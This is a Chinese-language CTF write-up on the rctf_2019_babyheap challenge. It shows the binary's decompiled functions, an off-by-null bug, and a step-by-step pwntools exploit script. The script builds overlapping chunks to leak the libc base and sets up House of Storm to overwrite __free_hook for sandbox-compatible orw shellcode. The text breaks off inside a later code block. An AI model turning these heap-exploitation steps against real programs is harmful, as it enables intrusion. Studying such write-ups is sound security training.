<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>House of Storm + 堆SROP + orw | Ky不是枕木</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Ky不是枕木" type="application/atom+xml">
</head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>House of Storm + 堆SROP + orw</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-10T15:14:29.000Z" id="date"> 2023-04-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-09-12T09:16:43.801Z" id="updated"> 2023-09-12</time></div></span><br><span>Word Count: <div class="control">2.1k</div></span><br><span>Read Time: <div class="control">11 min</div></span></div></div><hr><div id="post-content"><p><strong>同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，<br>
若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。</strong></p>
<h1>例题</h1>
<h2 id="rctf-2019-babyheap"><a href="#rctf-2019-babyheap" class="headerlink" title="rctf-2019-babyheap"></a>rctf_2019_babyheap</h2>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/6a20e21660eb442fb4871b211f9bbe59.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/d5ddcfdaa4074a059283f919bb74e430.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>
保护全开，禁用了execve就是禁用了system，因为system函数通过调用execve函数才能执行。<br>
看一下ida</p>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3>
<p>可以看到是实现了四个功能，增改删查</p>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-built_in">init</span>(argc, argv, envp);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">menu</span>();<br>    <span class="hljs-keyword">switch</span> ( <span class="hljs-built_in">get_int</span>() )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">add</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">edit</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">delete</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">show</span>();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"See you next time!"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid choice!"</span>);<br>        <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure>
<h3 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h3>
<p>可以申请最大0x1000大小的chunk，最多申请16个chunk</p>
<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">void</span> **v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+4h] [rbp-1Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; *(ptrs + <span class="hljs-number">2</span> * i) &amp;&amp; i &lt;= <span class="hljs-number">15</span>; ++i )<br>    ;<br>  <span class="hljs-keyword">if</span> ( i == <span class="hljs-number">16</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You can't"</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  }<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size: "</span>);<br>  size = <span class="hljs-built_in">get_int</span>();<br>  <span class="hljs-keyword">if</span> ( size &lt;= <span class="hljs-number">0</span> || size &gt; <span class="hljs-number">0x1000</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid size :("</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    *(ptrs + <span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>) = size;<br>    v0 = (ptrs + <span class="hljs-number">16</span> * i);<br>    *v0 = <span class="hljs-built_in">calloc</span>(size, <span class="hljs-number">1uLL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Add success :)"</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>}<br></code></pre></td></tr></tbody></table></figure>
<h3 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h3>
<p>存在off-by-null漏洞</p>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = <span class="hljs-built_in">get_int</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(ptrs + <span class="hljs-number">2</span> * v1) )<br>  {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content: "</span>);<br>    *(*(ptrs + <span class="hljs-number">2</span> * v1) + <span class="hljs-built_in">read_n</span>(*(ptrs + <span class="hljs-number">2</span> * v1), *(ptrs + <span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>))) = <span class="hljs-number">0</span>; <span class="hljs-comment">//off-by-one</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Edit success :)"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid index :("</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure>
<h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = <span class="hljs-built_in">get_int</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(ptrs + <span class="hljs-number">2</span> * v1) )<br>  {<br>    <span class="hljs-built_in">free</span>(*(ptrs + <span class="hljs-number">2</span> * v1));<br>    *(ptrs + <span class="hljs-number">2</span> * v1) = <span class="hljs-number">0LL</span>;<br>    *(ptrs + <span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Delete success :)"</span>);<br>  }<br>  <span class="hljs-keyword">else</span><br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid index :("</span>);<br>  }<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure>
<h3 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h3>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = <span class="hljs-built_in">get_int</span>();<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(ptrs + <span class="hljs-number">2</span> * v1) )<br>    <span class="hljs-built_in">puts</span>(*(ptrs + <span class="hljs-number">2</span> * v1));<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid index :("</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3>
<p>看了大佬的博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44145820/article/details/105709145">rctf_2019_babyheap</a>，这里对其进行详细的解析。<br class='item-img' data-src='https://img-blog.csdnimg.cn/c2a49de2eb0a492d882fd2f865cb3fd9.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/c2a49de2eb0a492d882fd2f865cb3fd9.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>
程序禁用了fastbin，且能申请最大为0x1000大小的chuck，可以使用house of storm，修改free_hook的地址为shellcode，执行shellcode，这里我们需要用orw来写shellcode，并且在这之前需要用mprotect函数修改free_hook段为可读可写可执行权限。</p>
<h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2>
<p>先把前面的写好</p>
<figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs vim"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br>#sh = remote(<span class="hljs-string">"node4.buuoj.cn"</span>, <span class="hljs-number">29278</span>)<br><span class="hljs-keyword">sh</span> = process(<span class="hljs-string">'./rctf_2019_babyheap'</span>)<br>context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'amd64'</span>, os = <span class="hljs-string">'linux'</span>)<br>elf = ELF(<span class="hljs-string">"./rctf_2019_babyheap"</span>)<br>libc = ELF(<span class="hljs-string">'../../libc-2.23.so--64'</span>)<br>def dbg():<br>        gdb.attach(<span class="hljs-keyword">sh</span>)<br>        pause()<br><br>#命令简写化<br>s       = lambda data               :<span class="hljs-keyword">sh</span>.send(data)<br><span class="hljs-keyword">sa</span>      = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendafter(delim, data)<br><span class="hljs-keyword">sl</span>      = lambda data               :<span class="hljs-keyword">sh</span>.sendline(data)<br><span class="hljs-keyword">sla</span>     = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendlineafter(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :<span class="hljs-keyword">sh</span>.recv(num)<br><span class="hljs-keyword">ru</span>      = lambda delims   :<span class="hljs-keyword">sh</span>.recvuntil(delims)<br>itr     = lambda                    :<span class="hljs-keyword">sh</span>.interactive()<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br><span class="hljs-keyword">lg</span>=lambda address,dat<span class="hljs-variable">a:log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br><br> <br>def <span class="hljs-built_in">add</span>(size):<br>	<span class="hljs-keyword">ru</span>(<span class="hljs-string">"Choice: \n"</span>)<br>	<span class="hljs-keyword">sl</span>(<span class="hljs-string">'1'</span>)<br>	<span class="hljs-keyword">ru</span>(<span class="hljs-string">"Size: "</span>)<br>	<span class="hljs-keyword">sl</span>(str(size))<br><br>def free(<span class="hljs-built_in">index</span>):<br>	<span class="hljs-keyword">ru</span>(<span class="hljs-string">"Choice: \n"</span>)<br>	<span class="hljs-keyword">sl</span>(<span class="hljs-string">'3'</span>)<br>	<span class="hljs-keyword">ru</span>(<span class="hljs-string">"Index: "</span>)<br>	<span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br><br>def show(<span class="hljs-built_in">index</span>):<br>	<span class="hljs-keyword">ru</span>(<span class="hljs-string">"Choice: \n"</span>)<br>	<span class="hljs-keyword">sl</span>(<span class="hljs-string">'4'</span>)<br>	<span class="hljs-keyword">ru</span>(<span class="hljs-string">"Index: "</span>)<br>	<span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br><br>def <span class="hljs-keyword">edit</span>(<span class="hljs-built_in">index</span>, content):<br>	<span class="hljs-keyword">ru</span>(<span class="hljs-string">"Choice: \n"</span>)<br>	<span class="hljs-keyword">sl</span>(<span class="hljs-string">'2'</span>)<br>	<span class="hljs-keyword">ru</span>(<span class="hljs-string">"Index: "</span>)<br>	<span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br>	<span class="hljs-keyword">ru</span>(<span class="hljs-string">"Content: "</span>)<br>	s(content)<br></code></pre></td></tr></tbody></table></figure>
<h3 id="首先构造堆块重叠，泄露libc基地址"><a href="#首先构造堆块重叠，泄露libc基地址" class="headerlink" title="首先构造堆块重叠，泄露libc基地址"></a>首先构造堆块重叠，泄露libc基地址</h3>
<p>先申请四个chunk，申请的chunk真正大小分别为0x90,0x70,0x100,0x20,<br>
chunk_3是为了free前三个chunk后防止堆块合并</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x80)</span></span>#<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x68)</span></span>#<span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>xf0)</span></span>#<span class="hljs-number">2</span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x18)</span></span>#<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b273495bb0594e12a61988abd446ee94.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/b273495bb0594e12a61988abd446ee94.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>
之后free chunk_0，此时因为禁用了fastbin，所以chunk_0直接进入了unsortedbin里，再利用off-by-null漏洞修改chunk_2的pre_size为0x100（chunk_0+chunk_1正好就是0x100），修改chunk_2的size为0x100，使他处于free状态。</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span><br>payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x60 + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x100)<br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">1</span>, payload)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/b4ecbc1851fb4a11b72f4961b3cb4df3.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/b4ecbc1851fb4a11b72f4961b3cb4df3.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>
free chunk_2后，触发堆块前向合并，chunk_2的pre_size为是0x100,chunk_0和chunk_1加起来是0x100，就是前三个chunk合并。unsortedbin里存放着原chunk_0的起始地址。</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/62792e0e3da5422d95259220edb7fdb8.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/62792e0e3da5422d95259220edb7fdb8.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/dd94627bad054eb4b8269b4b8e123b05.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/dd94627bad054eb4b8269b4b8e123b05.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br>
此时chunk_1是没有被free的，然后我们再次申请0x80（原chunk_0大小）大小的chunk，此时原chunk_1的mem区域存放着main_arena+88，因为chunk_1并没有被free，所以我们直接调用show函数即可泄露libc基地址。</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x80)</span></span>#<span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br>malloc_hook = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\x7f'</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0</span>x58 - <span class="hljs-number">0</span>x10<br>libc<span class="hljs-selector-class">.address</span> = malloc_hook - libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'__malloc_hook'</span>]</span><br>system = libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'system'</span>]</span><br>free_hook = libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'__free_hook'</span>]</span><br>set_context = libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'setcontext'</span>]</span><br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'libc_base'</span>,libc.address)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/9ff831c9123540d58be264d17010621a.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/9ff831c9123540d58be264d17010621a.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/9869752c89264053a4f41e7c96e5278d.png?ynotemdtimestamp=1663776411460'><img src="https://img-blog.csdnimg.cn/9869752c89264053a4f41e7c96e5278d.png?ynotemdtimestamp=1663776411460" alt="在这里插入图片描述"></p>
<h3 id="构造unsortbin-chunk-和largebin-chunk，进行-house-of-strom"><a href="#构造unsortbin-chunk-和largebin-chunk，进行-house-of-strom" class="headerlink" title="构造unsortbin-chunk-和largebin-chunk，进行-house-of-strom"></a>构造unsortbin chunk 和largebin chunk，进行 house of strom</h3>
<p>先申请0x160大小的chunk，将unsortbin中残余chunk清空，之后构造unsortbin chunk 和largebin chunk的调试过程请参考我另一篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/tbsqigongzi/article/details/126185571?spm=1001.2014.3001.5502">House of storm</a><br>
此时我们已以可以修改free_hook处的值了</p>
<figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 